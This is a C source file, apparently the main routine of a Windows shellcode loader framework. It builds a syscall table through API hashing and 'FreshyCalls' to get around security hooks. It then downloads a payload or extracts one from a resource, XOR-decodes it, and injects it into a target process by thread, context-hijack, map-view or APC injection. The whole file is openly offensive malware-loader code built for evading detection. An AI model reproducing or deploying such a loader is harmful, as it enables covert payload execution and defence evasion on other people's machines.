#include <windows.h>
#include "HeaderFiles/APIHashing.h"
#include "HeaderFiles/FreshyCalls.h"
#include "HeaderFiles/Extractor.h"
#include "HeaderFiles/IndirectInjector.h"
#include "Customization.h"

unsigned char* payload;
SIZE_T payload_len;
unsigned char key[] = KEY;
SIZE_T key_len = sizeof(key);

int main(void) {
	node* head = NULL;
	createSyscallTable(&head);
	
#ifdef DOWNLOAD
	DownloadPayload(&payload, &payload_len, key, key_len);
#endif
#ifdef RESOURCE
	ExtractPayload(&payload, &payload_len);
#endif

#ifdef XOR
	deobfuscate_xor(payload, payload_len, key, key_len);
#endif

#ifdef THREADINJECTION
	ThreadInjection(head, PROCESS, payload, payload_len);
#endif
#ifdef CONTEXTINJECTION
	ContextInjection(head, PROCESS, payload, payload_len);
#endif
#ifdef MAPVIEWINJECTION
	MapViewInjection(head, PROCESS, payload, payload_len);
#endif
#ifdef APCLAZYINJECTION
	APCLazyInjection(head, PROCESS, payload, payload_len);
#endif
#ifdef APCEAGERINJECTION
	APCEagerInjection(head, PROCESS, payload, payload_len);
#endif
}